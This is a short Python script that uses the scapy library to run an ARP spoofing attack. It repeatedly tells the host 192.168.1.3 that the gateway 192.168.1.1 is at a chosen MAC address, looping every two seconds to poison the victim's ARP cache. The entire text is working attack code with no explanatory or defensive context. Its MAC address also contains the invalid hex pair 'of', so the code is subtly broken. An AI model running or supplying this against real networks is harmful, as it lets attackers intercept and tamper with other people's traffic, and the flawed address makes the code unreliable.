from scapy.all import *
import time

op=1 # Op code 1 for ARP requests
victim= "192.168.1.3"
spoof= "192.168.1.1"
mac= "00:0c:29:e3:20:of"

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
    send(arp)
    time.sleep(2)
